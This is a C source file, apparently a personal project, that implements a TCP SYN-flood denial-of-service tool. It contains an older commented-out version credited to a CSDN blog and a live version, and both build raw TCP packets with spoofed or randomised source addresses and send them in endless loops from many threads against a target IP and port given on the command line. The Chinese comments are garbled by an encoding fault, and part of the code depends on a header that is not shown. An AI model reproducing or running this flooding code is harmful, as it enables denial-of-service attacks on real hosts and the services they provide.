/*#include <iostream>
#define Main main




int Main(int argc,char **argv)
{

	for (int i = 0; i < 10; i++)
	{
		std::cout << "���� " << std::endl;
		std::cout << "Hello World!" << std::endl;
	}



	return 0;
}
*/

/******************************************************************************
			 Copyright (C), 2018-2019,  xxx Co.xxx, Ltd.
 ******************************************************************************
	File Name     : Dos_tcp.c
	Version       : V1.0
	Author        : lijd
	Created       : 2018/12/07
	Description   : tcp��ʽDos��������ʵ��
	History       :
******************************************************************************/
/*#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <arpa/inet.h>
#include <pthread.h>

#define MAXCHILD			128
#define PROTO_NAME 			"tcp"
#define FAKE_IP 			"192.168.0.222"

static unsigned long dest = 0;
static unsigned short dest_port = 0;
static int PROTO_TCP = -1;
static int alive = -1;
int rawsock = 0;

typedef struct dosseg_t {
	struct ip iph;
	struct tcphdr tcph;
	unsigned char data[8192];
}DOSSEG_T;

//���ݰ�У��
static unsigned short Dos_cksum(unsigned short *data, int length)
{
	register int left = length;
	register unsigned short *word = data;
	register int sum = 0;
	unsigned short ret = 0;

	while (left > 1)
	{
		sum += *word++;
		left -= 2;
	}

	if (left == 1)
	{
		*(unsigned char *)(&ret) = *(unsigned char *)word;
		sum += ret;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);

	ret = ~sum;
	return (ret);
}

//������ɹ�������Դ�˿�
static inline long myrandom(int begin, int end)
{
	int gap = end - begin + 1;
	int ret = 0;

	srand((unsigned)time(0));

	ret = random() % gap + begin;
	return ret;
}

static void Dos_sig(int null)
{
	alive = 0;
	printf("stop DoS Attack!\n");
}

//����tcp������syn��
void DoS_tcp_pack(char* packet)
{
	char *buffer;

	struct ip* ip_hdr = (struct ip*)packet;
	struct tcphdr* tcp_hdr = (struct tcphdr*)(packet + sizeof(struct ip));

	//ipͷ��ֵ
	ip_hdr->ip_v = 4;
	ip_hdr->ip_hl = 5;
	ip_hdr->ip_tos = 0;
	ip_hdr->ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr));
	ip_hdr->ip_id = htons(getpid());
	ip_hdr->ip_off = 0;
	ip_hdr->ip_ttl = 64;
	ip_hdr->ip_p = PROTO_TCP;
	ip_hdr->ip_sum = 0;
	ip_hdr->ip_src.s_addr = inet_addr(FAKE_IP);		//αװԴ��ַ
	ip_hdr->ip_dst.s_addr = dest; 					//������Ŀ��������ַ
	ip_hdr->ip_sum = Dos_cksum((unsigned short *)ip_hdr, (4 * ip_hdr->ip_hl + sizeof(struct tcphdr) + 1) & ~1);

	//tcp��ֵ
	tcp_hdr->seq = htonl((unsigned long)myrandom(0, 65535));
	tcp_hdr->ack_seq = htons(myrandom(0, 65535));
	tcp_hdr->syn = 1;
	tcp_hdr->urg = 1;
	tcp_hdr->window = htons(myrandom(0, 65535));
	tcp_hdr->check = 0;
	tcp_hdr->urg_ptr = htons(myrandom(0, 65535));
	tcp_hdr->check = Dos_cksum((unsigned short *)tcp_hdr, (sizeof(struct ip) + sizeof(struct tcphdr) + 1) & ~1);
}

void *Dos_Attack(void *null)
{
	DOSSEG_T packet;
	struct sockaddr_in to;
	DoS_tcp_pack((char *)&packet);

	to.sin_family = AF_INET;
	to.sin_addr.s_addr = dest;
	to.sin_port = htons(0);

	while (alive)  //���Ʒ�����ȫ�ֱ���
	{
		sendto(rawsock,
			&packet,
			4 * packet.iph.ip_hl + sizeof(struct tcphdr),
			0,
			(struct sockaddr*)&to,
			sizeof(struct sockaddr));
	}
}

int main(int argc, char* argv[])
{
	struct hostent* host = NULL;
	struct protoent* protocol = NULL;
	int i = 0, err = -1;
	pthread_t attack_thread[MAXCHILD];

	///* ����ֹͣ�źŽ��պ���
	alive = 1;
	signal(SIGINT, Dos_sig);

	if (argc < 3)
	{
		printf("-------------Invalid input---------------!\n");
		return -1;
	}

	protocol = getprotobyname(PROTO_NAME);
	if (protocol == NULL)
	{
		printf("Fail to getprotobyname!\n");
		return -1;
	}

	PROTO_TCP = protocol->p_proto;

	//����1������Ŀ��IP   ����2��������Ŀ��Port
	dest = inet_addr(argv[1]);
	dest_port = atoi(argv[2]);

	if (dest == INADDR_NONE)
	{
		host = gethostbyname(argv[1]);
		if (host == NULL)
		{
			printf("Invalid IP or Domain name!\n");
			return -1;
		}

		memcpy((char *)&dest, host->h_addr, host->h_length);
	}

	//����ԭʼ�׽���
	rawsock = socket(AF_INET, SOCK_RAW, PROTO_TCP);

	if (rawsock < 0)
	{
		printf("Fait to create socket!\n");
		return -1;
	}

	//����IPѡ��
	setsockopt(rawsock, IPPROTO_IP, IP_HDRINCL, "1", sizeof("1"));

	printf("ICMP FLOOD ATTACK START\n");

	for (i = 0; i < MAXCHILD; i++)
	{
		err = pthread_create(&(attack_thread[i]), NULL, Dos_Attack, NULL);
		if (err)
		{
			printf("Fail to create thread, err %d, thread id : %d\n", err, attack_thread[i]);
		}
	}

	for (i = 0; i < MAXCHILD; i++)
	{
		pthread_join(attack_thread[i], NULL);
		//�ȴ��߳̽���
	}

	printf("ICMP ATTACK FINISHI!\n");
	close(rawsock);

	return 0;
}*/
//-------------------- -
//���ߣ���ũʫ��
//��Դ��CSDN
//ԭ�ģ�https ://blog.csdn.net/ddazz0621/article/details/84870186 
//��Ȩ����������Ϊ����ԭ�����£�ת���븽�ϲ������ӣ�




/*
	README
	������Ҫ��
	//��windows�����ɻ�ʧ��
*/
#include "DDOS.h"

#define MAXCHILD 128
/* ԭʼ�׽��� */
int sockfd;
/* ������־ */
static int alive = -1;
char dst_ip[20] = { 0 };
int dst_port;
/* CRC16У�� */
unsigned short inline checksum(unsigned short *buffer, unsigned short size)
{
	unsigned long cksum = 0;
	while (size > 1)	{
		cksum += *buffer++;
		size -= sizeof(unsigned short);
	}
	if (size)	{
		cksum += *(unsigned char *)buffer;
	}
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >> 16);
	return((unsigned short)(~cksum));
}
/* ����SYN������
 * ��дIPͷ����TCPͷ��
 * TCPαͷ��������У��͵ļ���
 */
void init_header(struct ip *ip, struct tcphdr *tcp, struct pseudohdr *pseudoheader)
{
	int len = sizeof(struct ip) + sizeof(struct tcphdr);
	// IPͷ�����ݳ�ʼ��
	ip->hl = (4 << 4 | sizeof(struct ip) / sizeof(unsigned int));
	ip->tos = 0;
	ip->total_len = htons(len);
	ip->id = 1;
	ip->frag_and_flags = 0x40;
	ip->ttl = 255;
	ip->proto = IPPROTO_TCP;
	ip->checksum = 0;
	ip->sourceIP = 0;
	ip->destIP = inet_addr(dst_ip);
	// TCPͷ�����ݳ�ʼ��
	tcp->sport = htons(rand() % 16383 + 49152);
	tcp->dport = htons(dst_port);
	tcp->seq = htonl(rand() % 90000000 + 2345);
	tcp->ack = 0;
	tcp->lenres = (sizeof(struct tcphdr) / 4 << 4 | 0);
	tcp->flag = 0x02;
	tcp->win = htons(2048);
	tcp->sum = 0;
	tcp->urp = 0;
	//TCPαͷ��
	pseudoheader->zero = 0;
	pseudoheader->protocol = IPPROTO_TCP;
	pseudoheader->length = htons(sizeof(struct tcphdr));
	pseudoheader->daddr = inet_addr(dst_ip);
	srand((unsigned)time(NULL));
}
/* ����SYN������
 * ��дIPͷ����TCPͷ��
 * TCPαͷ��������У��͵ļ���
 */
void *send_synflood(void *addr)
{
	char buf[100], sendbuf[100];
	int len;
	struct ip ip;			//IPͷ��
	struct tcphdr tcp;		//TCPͷ��
	struct pseudohdr pseudoheader;	//TCPαͷ��
	len = sizeof(struct ip) + sizeof(struct tcphdr);
	/* ��ʼ��ͷ����Ϣ */
	init_header(&ip, &tcp, &pseudoheader);
	/* ���ڻ״̬ʱ��������SYN�� */
	while (alive)
	{
		ip.sourceIP = rand();
		//����IPУ���
		bzero(buf, sizeof(buf));
		memcpy(buf, &ip, sizeof(struct ip));
		ip.checksum = checksum((u_short *)buf, sizeof(struct ip));
		pseudoheader.saddr = ip.sourceIP;
		//����TCPУ���
		bzero(buf, sizeof(buf));
		memcpy(buf, &pseudoheader, sizeof(pseudoheader));
		memcpy(buf + sizeof(pseudoheader), &tcp, sizeof(struct tcphdr));
		tcp.sum = checksum((u_short *)buf, sizeof(pseudoheader) + sizeof(struct tcphdr));
		bzero(sendbuf, sizeof(sendbuf));
		memcpy(sendbuf, &ip, sizeof(struct ip));
		memcpy(sendbuf + sizeof(struct ip), &tcp, sizeof(struct tcphdr));
		int sendLen = sendto(sockfd, sendbuf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr));
		//printf("sendLen %d \n", sendLen);
		if (sendLen < 0)
		{
			perror("sendto()");
			pthread_exit(NULL);
		}
		//sleep(1);
	}
}

/* �źŴ�����,�����˳�����alive */
void sig_int(int signo)
{
	alive = 0;
}
/* ������ */
int main(int argc, char *argv[])
{
	FLOOD->judge_argc(argc);

	FLOOD->initDos(argv[1], argv[2]);
	FLOOD->run();


	FLOOD->joinThread();

	//struct sockaddr_in addr;
	//struct hostent * host = NULL;
	//int on = 1;
	//int i = 0;
	//pthread_t pthread[MAXCHILD];
	//int err = -1;
	//alive = 1;
	///* ��ȡ�ź�CTRL+C */
	//signal(SIGINT, sig_int);
	//strncpy(dst_ip, argv[1], 16);
	//dst_port = atoi(argv[2]);
	//bzero(&addr, sizeof(addr));
	//addr.sin_family = AF_INET;
	//addr.sin_port = htons(dst_port);
	//if (inet_addr(dst_ip) == INADDR_NONE)
	//{
	//	/* ΪDNS��ַ����ѯ��ת����IP��ַ */
	//	host = gethostbyname(argv[1]);
	//	if (host == NULL)
	//	{
	//		perror("gethostbyname()");
	//		exit(1);
	//	}
	//	addr.sin_addr = *((struct in_addr*)(host->h_addr));
	//	strncpy(dst_ip, inet_ntoa(addr.sin_addr), 16);
	//}
	//else
	//{
	//	addr.sin_addr.s_addr = inet_addr(dst_ip);
	//}

	//if (dst_port < 0 || dst_port > 65535)
	//{
	//	printf("Port Error\n");
	//	exit(1);
	//}
	//printf("host ip=%s\n", inet_ntoa(addr.sin_addr));
	///* ����ԭʼsocket */
	////IPPROTO_RAW
	////sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	//sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	//if (sockfd < 0)
	//{
	//	perror("socket()");
	//	exit(1);
	//}
	///* ����IPѡ�� */
	//if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 0)
	//{
	//	perror("setsockopt()");
	//	exit(1);
	//}
	///* �������Ȩ���޸�Ϊ��ͨ�û� */
	//setuid(getpid());
	///* ��������߳�Эͬ���� */
	//for (i = 0; i < MAXCHILD; i++)
	//{
	//	err = pthread_create(&pthread[i], NULL, send_synflood, &addr);
	//	if (err != 0)
	//	{
	//		perror("pthread_create()");
	//		exit(1);
	//	}
	//}
	///* �ȴ��߳̽��� */
	//for (i = 0; i < MAXCHILD; i++)
	//{
	//	err = pthread_join(pthread[i], NULL);
	//	if (err != 0)
	//	{
	//		perror("pthread_join Error\n");
	//		exit(1);
	//	}
	//}
	//close(sockfd);
	return 0;
}